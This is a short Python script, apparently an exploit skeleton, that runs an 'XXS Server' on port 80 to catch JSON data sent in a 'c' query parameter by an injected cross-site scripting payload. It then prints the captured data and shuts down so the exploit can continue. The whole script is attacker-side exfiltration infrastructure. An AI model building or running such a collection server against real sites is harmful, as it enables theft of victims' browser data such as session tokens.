#!/usr/bin/env python3
import http.server
import urllib.parse
import json
import threading

captured_data = None

class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> XXS Server')
        print('    >> Python Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

class CaptureHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global captured_data

        url_components = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(url_components.query)

        # Check if the <c> is in the request, this is what needs to be appenned to the xxs
        if "c" in query_params:
            json_data = query_params["c"][0]  # Get the first instance of c
            try:
                captured_data = json.loads(json_data)
                output.success(f"Captured JSON Data: {captured_data}")

                threading.Thread(target=self.shutdown_server).start()

            except json.JSONDecodeError:
                output.error("Failed to decode JSON data")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data captured. Server shutting down.")

    def shutdown_server(self):
        self.server.shutdown()

def run_server():
    server_address = ('', 80)
    httpd = http.server.HTTPServer(server_address, CaptureHandler)
    output.info("Server is running and waiting to capture JSON data...")
    httpd.serve_forever()

def main():
    global output
    output = Interface()
    output.header()
    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    server_thread.join()
    output.info("Server has stopped. Finishing the exploitProceeding with the rest of the script.")
    output.success(f"Captured Data:\n{captured_data}")

if __name__ == '__main__':
    main()
